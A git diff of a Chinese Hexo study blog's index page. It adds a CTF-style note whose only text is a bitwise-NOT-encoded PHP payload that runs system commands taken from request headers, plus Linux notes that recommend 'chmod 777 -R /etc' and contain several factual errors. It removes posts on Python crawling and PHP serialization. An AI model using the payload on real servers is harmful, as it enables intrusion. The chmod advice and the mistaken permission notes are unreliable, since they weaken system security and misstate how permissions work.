@@ -64,6 +64,138 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-学习笔记10" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/12/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010/" class="article-date">
+  <time datetime="2020-12-15T05:53:38.473Z" itemprop="datePublished">2020-12-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<hr>
+<p><img src="C:\Users\ggken\AppData\Roaming\Typora\typora-user-images\image-20201215135456955.png" alt="image-20201215135456955"></p>
+<p><img src="C:\Users\ggken\AppData\Roaming\Typora\typora-user-images\image-20201215143317291.png" alt="image-20201215143317291"></p>
+<p><img src="C:\Users\ggken\AppData\Roaming\Typora\typora-user-images\image-20201215145933621.png" alt="image-20201215145933621"></p>
+<p><img src="C:\Users\ggken\AppData\Roaming\Typora\typora-user-images\image-20201215150021504.png" alt="image-20201215150021504"></p>
+<p><img src="C:\Users\ggken\AppData\Roaming\Typora\typora-user-images\image-20201215150046880.png" alt="image-20201215150046880"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;[~%8F%8D%96%91%8B%A0%8D][!%FF]([~%8C%86%8C%8B%9A%92][!%FF]([~%9A%91%9B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]())));</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\ggken\AppData\Roaming\Typora\typora-user-images\image-20201215151550554.png" alt="image-20201215151550554"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://ggken753.github.io/2020/12/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010/" data-id="ckiqyhpbo0000uov34e9tbmk3" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-学习笔记9" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/12/11/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B09/" class="article-date">
+  <time datetime="2020-12-11T07:34:04.393Z" itemprop="datePublished">2020-12-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/12/11/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B09/">linux一些小知识</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="1-安装docker出错的一些笔记："><a href="#1-安装docker出错的一些笔记：" class="headerlink" title="1.安装docker出错的一些笔记："></a>1.安装docker出错的一些笔记：</h3><p>1.安装好centos 7 后，对yumj进行更新</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum update</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/efb8664c05220263345c1906b50abb7.png"></p>
+<p>报错，提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">There are no enabled repos</span><br></pre></td></tr></table></figure>
+
+<p>2.然后使用语句查看repos</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum repolist all</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/0055eac519718b074dad9f8298d2c52.png"></p>
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/584b937be048ed4981e07ac7e35e30b.png"></p>
+<p>发现repolist 为0；</p>
+<p>、、、、、、、、、</p>
+<p>尝试过换源，安装163源、阿里源都有报错无果…….</p>
+<h3 id="2-分析centos-7-系统里面的文件"><a href="#2-分析centos-7-系统里面的文件" class="headerlink" title="2. 分析centos 7 系统里面的文件"></a>2. 分析centos 7 系统里面的文件</h3><p><strong>Linux根目录”/“下各个系统文件夹的含义和用途</strong></p>
+<p>1、/boot 该目录默认下存放的是Linux的启动文件和内核。</p>
+<p>2、/initrd 它的英文含义是boot loader initialized RAM disk,就是由boot  loader初始化的内存盘。在linux内核启动前，boot  loader会将存储介质(一般是硬盘)中的initrd文件加载到内存，内核启动时会在访问真正的根文件系统前先访问该内存中的initrd文件系统。</p>
+<p>3、/bin 该目录中存放Linux的常用命令。</p>
+<p>4、/sbin 该目录用来存放系统管理员使用的管理程序。</p>
+<p>5、/var 该目录存放那些经常被修改的文件，包括各种日志、数据文件。</p>
+<p>6、/etc 该目录存放系统管理时要用到的各种配置文件和子目录，例如网络配置文件、文件系统、X系统配置文件、设备配置信息、设置用户信息等。</p>
+<p>7、/dev 该目录包含了Linux系统中使用的所有外部设备，它实际上是访问这些外部设备的端口，访问这些外部设备与访问一个文件或一个目录没有区别。</p>
+<p>8、/mnt 临时将别的文件系统挂在该目录下。</p>
+<p>9、/root 如果你是以超级用户的身份登录的，这个就是超级用户的主目录。</p>
+<p>10、/home 如果建立一个名为“xx”的用户，那么在/home目录下就有一个对应的“/home/xx”路径，用来存放该用户的主目录。</p>
+<p>11、/usr 用户的应用程序和文件几乎都存放在该目录下。</p>
+<p>12、/lib 该目录用来存放系统动态链接共享库，几乎所有的应用程序都会用到该目录下的共享库。</p>
+<p>13、/opt 第三方软件在安装时默认会找这个目录,所以你没有安装此类软件时它是空的,但如果你一旦把它删除了,以后在安装此类软件时就有可能碰到麻烦。</p>
+<p>14、/tmp 用来存放不同程序执行时产生的临时文件，该目录会被系统自动清理干净。</p>
+<p>15、/proc 可以在该目录下获取系统信息，这些信息是在内存中由系统自己产生的，该目录的内容不在硬盘上而在内存里。</p>
+<p>16、/misc 可以让多用户堆积和临时转移自己的文件。</p>
+<p>17、/lost＋found 该目录在大多数情况下都是空的。但当突然停电、或者非正常关机后，有些文件就临时存放在这里。</p>
+<p>18、文件颜色的含义：蓝色为文件夹；绿色是可执行文件；浅蓝色是链接文件；红框文件是加了SUID位，任意限权；红色为压缩文件；褐色为设备文件。</p>
+<p>1、bin： 包含常用的Linux用户命令，例如，ls、sort、date和chmod。</p>
+<p>2、/boot： 包含可引导的Linux内核和引导装载（boot loader）配置文件（GRUB）。</p>
+<p>3、/dev： 包含代表系统设备访问点的文件。这包括终端设备（tty*)、软盘（fd<em>）、硬盘（hd</em>）、RAM（ram<em>）和CD-ROM（cd</em>）（用户通常通过设备文件直接访问这些设备）。</p>
+<p>4、/etc：包含管理配置文件。</p>
+<p>5、/home： 包含分配给每个拥有登陆帐号用户的目录。</p>
+<p>6、/media：提供挂载（mounting）和自动挂载设备的标准位置，如远程文件系统和可移动介质（目录名为cdrecorder、floppy等）。</p>
+<p>7、/mnt： 在被标准的/media目录替代前，这是很多设备常用的挂载点。某些可引导的Linux系统仍旧使用该目录来挂载硬盘分区和远程文件系统。</p>
+<p>8、/proc：包含有关系统资源的信息。</p>
+<p>9、/root：表示根用户的主目录。</p>
+<p>10、/sbin：包含管理命令和守护进程。</p>
+<p>11、/sys：一个类似与/proc的文件系统，在Linux2.6内核中最新出现的，包含的文件用于获得硬件状态并反映内核看到的系统设备树。它使用了/proc中的很多帮助。</p>
+<p>12、/tmp：包含应用程序使用的临时文件。</p>
+<p>13、/usr：包含用户文档、游戏、图形文件（X11）、库（lib），以及各种其他用户和管理命令及文件</p>
+<p>14、/var：包含不同应用程序使用的数据目录。特别要注意的是，这里放置作为FTP服务器（/var/ftp）成Web服务器（/var/www）共享文件。它还包含所有系统日志文件（/var/log）。</p>
+<h3 id="3-chmod命令"><a href="#3-chmod命令" class="headerlink" title="3. chmod命令"></a>3. chmod命令</h3><p>当文件设有权限时，可以使用chmod命令来获得权限、</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 -R &#x2F;etc</span><br></pre></td></tr></table></figure>
+
+<p>设置Filename下所有文件权限<br>chmod -R 777 fileName<br>指令名称 : chmod<br>使用权限 : 所有使用者<br>使用方式 : chmod [-cfvR] [–help] [–version] mode file…<br>说明 : Linux/Unix 的档案调用权限分为三级 : 档案拥有者、群组、其他。利用 chmod 可以藉以控制档案如何被他人所调用。<br>参数 :<br>mode : 权限设定字串，格式如下 : [ugoa…][[+-=][rwxX]…][,…]，其中<br>u 表示该档案的拥有者，g 表示与该档案的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是。<br>+ 表示增加权限、- 表示取消权限、= 表示唯一设定权限。<br>r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该档案是个子目录或者该档案已经被设定过为可执行。<br>-c : 若该档案权限确实已经更改，才显示其更改动作<br>-f : 若该档案权限无法被更改也不要显示错误讯息<br>-v : 显示权限变更的详细资料<br>-R : 对目前目录下的所有档案与子目录进行相同的权限变更(即以递回的方式逐个变更)<br>–help : 显示辅助说明<br>–version : 显示版本<br>范例 :将档案 file1.txt 设为所有人皆可读取 :<br>chmod ugo+r file1.txt<br>将档案 file1.txt 设为所有人皆可读取 :<br>chmod a+r file1.txt<br>将档案 file1.txt 与 file2.txt 设为该档案拥有者，与其所属同一个群体者可写入，但其他以外的人则不可写入 :<br>chmod ug+w,o-w file1.txt file2.txt<br>将 ex1.py 设定为只有该档案拥有者可以执行 :<br>chmod u+x ex1.py<br>将目前目录下的所有档案与子目录皆设为任何人可读取 :<br>chmod -R a+r *<br>此外chmod也可以用数字来表示权限如 chmod 777 file<br>语法为：chmod abc file<br>其中a,b,c各为一个数字，分别表示User、Group、及Other的权限。<br>r=4，w=2，x=1<br>若要rwx属性则4+2+1=7；<br>若要rw-属性则4+2=6；<br>若要r-x属性则4+1=7。<br>范例：<br>chmod a=rwx file<br>和<br>chmod 777 file<br>效果相同<br>chmod ug=rwx,o=x file<br>和<br>chmod 771 file<br>效果相同<br>若用chmod 4755 filename可使此程序具有root的权限.<br>指令名称 : chown<br>使用权限 : root</p>
+<p>使用方式 : chmod [-cfhvR] [–help] [–version] user[] file…</p>
+<p>说 明 : Linux/Unix 是多人多工作业系统，所有的档案皆有拥有者。利用 chown  可以将档案的拥有者加以改变。一般来说，这个指令只有是由  系统管理者(root)所使用，一般使用者没有权限可以改变别人的档案拥有者，也没有权限可以自己的档案拥有者改设为别人。只有系统管理者(root)才 有这样的权限。</p>
+<p>把计 :</p>
+<p>user : 新的档案拥有者的使用者 IDgroup : 新的档案拥有者的使用者群 体(group)-c :  若该档案拥有者确实已经更改，才显示其更改动作-f : 若该档案拥有者无法被更改也不要显示错误讯息-h : 只对于连结  (link)进行变更，而非该 link 真正指向的档案-v : 显示拥有者变更的详细资料-R : 对目前目录下的所有档案与子目录进行相同的拥有者 变更(即以递回的方式逐个变更)–help : 显示辅助说明–version : 显示版本</p>
+<p>范例 :<br>将档案 file1.txt 的拥有者设为 users 群体的使用者 jessie :<br>chown jessie:users file1.txt</p>
+<p>将目前目录下的所有档案与子目录的拥有者皆设为 users 群体的使用者 lamport :<br>chmod -R lamport:users *<br>-rw——- (600) – 只有属主有读写权限。<br>-rw-r–r– (644) – 只有属主有读写权限；而属组用户和其他用户只有读权限。<br>-rwx—— (700) – 只有属主有读、写、执行权限。<br>-rwxr-xr-x (755) – 属主有读、写、执行权限；而属组用户和其他用户只有读、执行权限。<br>-rwx–x–x (711) – 属主有读、写、执行权限；而属组用户和其他用户只有执行权限。<br>-rw-rw-rw- (666) – 所有用户都有文件读、写权限。这种做法不可取。<br>-rwxrwxrwx (777) – 所有用户都有读、写、执行权限。更不可取的做法。<br>以下是对目录的两个普通设定:</p>
+<p>drwx—— (700) - 只有属主可在目录中读、写。</p>
+<h3 id="4-drwxr-xr-x-755-所有用户可读该目录，但只有属主才能改变目录中的内容。"><a href="#4-drwxr-xr-x-755-所有用户可读该目录，但只有属主才能改变目录中的内容。" class="headerlink" title="4.drwxr-xr-x (755) - 所有用户可读该目录，但只有属主才能改变目录中的内容。"></a>4.drwxr-xr-x (755) - 所有用户可读该目录，但只有属主才能改变目录中的内容。</h3><p>运行 .sh 文件类型的文件：<br>用file命令测试一下看是什么类型的<br>file xxxx.sh<br>如果是Bourne-Again shell script 可以sh xxxx.sh 或者chmod +x xxxx.sh 再./xxx.sh<br>一般 .sh 的直接添加x(可执行属性) chmod +x xxx.sh 然后./xxx.sh就可以了</p>
+<h3 id="5-chmod是一个改变用户拥有指定文件的权限的命令-r-只读-w-写-x执行-也可以用数字"><a href="#5-chmod是一个改变用户拥有指定文件的权限的命令-r-只读-w-写-x执行-也可以用数字" class="headerlink" title="5.chmod是一个改变用户拥有指定文件的权限的命令.r:只读,w:写,x执行.也可以用数字"></a>5.chmod是一个改变用户拥有指定文件的权限的命令.r:只读,w:写,x执行.也可以用数字</h3>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://ggken753.github.io/2020/12/11/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B09/" data-id="ckiqyhpc00001uov35yl9278k" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-学习笔记8" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/11/26/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08/" class="article-date">
@@ -1202,281 +1334,6 @@
 
 
   
-    <article id="post-学习笔记1" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/10/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/" class="article-date">
-  <time datetime="2020-10-18T01:24:28.000Z" itemprop="datePublished">2020-10-18</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/">python爬虫笔记</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>. </p>
-<p>一.Python爬虫</p>
-<p>*什么是爬虫</p>
-<p>网络爬虫，是一种按照一定规则，自动抓取互联网信息的程序或脚本，由于互联网数据的多样性和资源的有限性，根据用户需求定向抓取相关网页并分析已成为如今主流的爬取策略</p>
-<p>*爬虫的本质是什么</p>
-<p>模拟浏览器打开网页，获取网页中我们的那一部分数据</p>
-<p>*编码规范</p>
-<p>\1. 一般python程序第一行需要加入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\#-*-coding:utf-8-*-或者#coding&#x3D;utf-8</span><br></pre></td></tr></table></figure>
-
-<p>这样可以在代码中包含中文；</p>
-<p>\2. 在python中，使用函数实现单一功能或相关功能的代码段，可以提高可读性和代码重复利用率，函数的代码块以def关键词开头，后接空格，函数标识符名称，圆括号()、冒号：，括号中可以传入参数，函数段缩进（Tab或四个空格，只能任选一种），return用于函数结束，可以返回一个值，也可以不但任何表达式（表示返回None）</p>
-<p>\3. python文件中可以加入main函数用于测试程序</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if_name_&#x3D;&#x3D;”_main_”:</span><br></pre></td></tr></table></figure>
-
-<p>\4. python使用#添加注释，说明代码段的作用</p>
-<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017155409804.png"></p>
-<p>1.引入模块</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import bs4  #网页解析，获取数据</span><br><span class="line">import re   #正则表达式，进行文字匹配</span><br><span class="line">import urllib.request,urllib.error  #制定URL，获取网页数据</span><br><span class="line">import sqlite3   #进行sqlite数据库操作</span><br></pre></td></tr></table></figure>
-
-<p>2.爬取网站</p>
-<p>获取一个get请求</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">response &#x3D; urllib.request.urlopen(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;)</span><br><span class="line">print(response)</span><br></pre></td></tr></table></figure>
-
-<p>输出的结果为</p>
-<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017160505869.png"></p>
-<p>然后再进行对代码加工</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">response &#x3D; urllib.request.urlopen(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;)</span><br><span class="line">print(response。read())</span><br></pre></td></tr></table></figure>
-
-<p>得到下面的结果</p>
-<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017160628973.png"></p>
-<p>我们将上面的代码复制下来新建一个文件改后缀名为html,把代码复制上去</p>
-<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017160803534.png"></p>
-<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017160814578.png"></p>
-<p>看上去还是很乱</p>
-<p>对获取到的网页源码用decoode(“utf-8”)进行解析</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">response &#x3D; urllib.request.urlopen(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;)</span><br><span class="line">print(response。read()。decode(&quot;utf-8&quot;))</span><br></pre></td></tr></table></figure>
-
-<p>得到</p>
-<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017161013144.png"></p>
-<p>重复上面的做法的到</p>
-<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017161042340.png"></p>
-<p>获取一个post请求</p>
-<p>首先打开测试网页httpbin.org</p>
-<p>用post请求</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">import urllib.pase #解析器</span><br><span class="line">data &#x3D;bytes(urllib.parse.urlencode(&#123;&quot;hello&quot;:&quot;world&quot;&#125;),encoding&#x3D;&quot;utf-8&quot;) #二进制数据包</span><br><span class="line">response&#x3D;urllib.request.urlopen(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;post&quot;,data&#x3D;data)</span><br><span class="line">print(response.read().decode(&quot;utf-8&quot;))</span><br></pre></td></tr></table></figure>
-
-<p>得到</p>
-<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017161643463.png"></p>
-<p>与测试网页post相应的返回值格式基本相似</p>
-<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017161704503.png"></p>
-<p>当使用get请求时</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response &#x3D;urllib.request.urlopen(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get&quot;)</span><br><span class="line">print(response.read().decode(&quot;utf-8&quot;))</span><br></pre></td></tr></table></figure>
-
-<p>得到相应的结果</p>
-<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017162022204.png"></p>
-<p>3.超时处理</p>
-<p>当对于一个网页的访问时长有一个时间限定时</p>
-<p>例</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response &#x3D;urllib.request.urlopen(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get&quot;,timeout&#x3D;0.01)</span><br><span class="line">print(response.read().decode(&quot;utf-8&quot;))</span><br></pre></td></tr></table></figure>
-
-<p>结果会报错</p>
-<p>可以运用</p>
-<p>try:</p>
-<p>except</p>
-<p>对执行的命令进行检测</p>
-<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017162729575.png"></p>
-<p>运行将返回一个</p>
-<p>time out</p>
-<p>4.其他爬取操作</p>
-<p>/1例如我们想知道网页的状态码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response &#x3D;urllib.request.urlopen(&quot;http:&#x2F;&#x2F;httpbin.org&quot;)</span><br><span class="line">print(response.status)</span><br></pre></td></tr></table></figure>
-
-<p>输出为</p>
-<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017163033353.png"></p>
-<p>/2获取网页的headers</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response &#x3D;urllib.request.urlopen(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;)</span><br><span class="line">print(response.getheaders())</span><br></pre></td></tr></table></figure>
-
-<p>输出</p>
-<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017163353698.png"></p>
-<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017163433382.png"></p>
-<p>Getheaders(“”)””里面可填写headers里面的信息进去查询获取</p>
-<p>/3伪装浏览器</p>
-<p>因为网页的开发和设定，有些网页不允许爬</p>
-<p>因此需要我们伪装浏览器</p>
-<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017163823454.png"></p>
-<p>输出</p>
-<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017163846195.png"></p>
-<p>发现我们的user-Agent为浏览器即伪装成功</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://ggken753.github.io/2020/10/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/" data-id="ckgdfpb2o00005cv38ubbe9k1" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-学习笔记" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/10/08/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-date">
-  <time datetime="2020-10-08T03:13:01.555Z" itemprop="datePublished">2020-10-08</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/08/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记一</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.     </p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><p> 所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。<br>为了能够unserialize()一个对象，这个对象的类必须已经定义过。如果序列化类A的一个对象，将会返回一个跟类A相关，而且包含了对象所有变量值的字符串。 如果要想在另外一个文件中解序列化一个对象，这个对象的类必须在解序列化之前定义，可以通过包含一个定义该类的文件或使用函数spl_autoload_register()来实现。<br>类型    过程<br>序列化    对象—&gt; 字符串<br>反序列化    字符串—&gt;对象<br>一．序列化</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class student&#123;</span><br><span class="line">    public <span class="variable">$name</span>;</span><br><span class="line">     public <span class="variable">$age</span>;</span><br><span class="line">     public <span class="variable">$number</span>;</span><br><span class="line"></span><br><span class="line">     //_construct：创建对象时初始化</span><br><span class="line">     <span class="keyword">function</span> __construct(<span class="variable">$name</span>,<span class="variable">$age</span>,<span class="variable">$number</span>)&#123;        </span><br><span class="line">          <span class="variable">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">          <span class="variable">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">          <span class="variable">$this</span>-&gt;number = <span class="variable">$number</span>;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$student</span> = new student(<span class="string">&quot;Jack&quot;</span>,22,11086);</span><br><span class="line">var_dump(serialize(<span class="variable">$student</span>));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">```    </span><br><span class="line">运行结果：</span><br><span class="line">```bash</span><br><span class="line">string(76) <span class="string">&quot;O:7:&quot;</span>student<span class="string">&quot;:3:&#123;s:4:&quot;</span>name<span class="string">&quot;;s:4:&quot;</span>Jack<span class="string">&quot;;s:3:&quot;</span>age<span class="string">&quot;;i:22;s:6:&quot;</span>number<span class="string">&quot;;i:11086;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
-<p>$student =’O:7:”student”:3:{s:4:”name”;s:4:”Jack”;s:3:”age”;i:22;s:6:”number”;i:11086;}’;中<br>O：表示对象；<br>7:表示类的名称的长度；<br>3:表示类中的成员属性有三个变量；<br>s:4、s:3、s:3、s:6 ：s表示字符串，后面的数字表示字符串的长度；<br>i:22、i:11086: i表示整形 后面数字表示整形的长度；</p>
-<p>二．反序列化</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class student&#123;</span><br><span class="line">    public <span class="variable">$name</span>;</span><br><span class="line">     public <span class="variable">$age</span>;</span><br><span class="line">     public <span class="variable">$number</span>;</span><br><span class="line"></span><br><span class="line">     //_construct：创建对象时初始化</span><br><span class="line">     <span class="keyword">function</span> __construct(<span class="variable">$name</span>,<span class="variable">$age</span>,<span class="variable">$number</span>)&#123;        </span><br><span class="line">          <span class="variable">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">          <span class="variable">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">          <span class="variable">$this</span>-&gt;number = <span class="variable">$number</span>;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$student</span> = <span class="string">&#x27;O:7:&quot;student&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;s:3:&quot;age&quot;;i:22;s:6:&quot;number&quot;;i:11086;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$student</span>));</span><br></pre></td></tr></table></figure>
-<p>运行结果</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">object(student)<span class="comment">#1 (3) &#123;</span></span><br><span class="line">  [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">  string(4) <span class="string">&quot;Jack&quot;</span></span><br><span class="line">  [<span class="string">&quot;age&quot;</span>]=&gt;</span><br><span class="line">  int(22)</span><br><span class="line">  [<span class="string">&quot;number&quot;</span>]=&gt;</span><br><span class="line">  int(11086)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
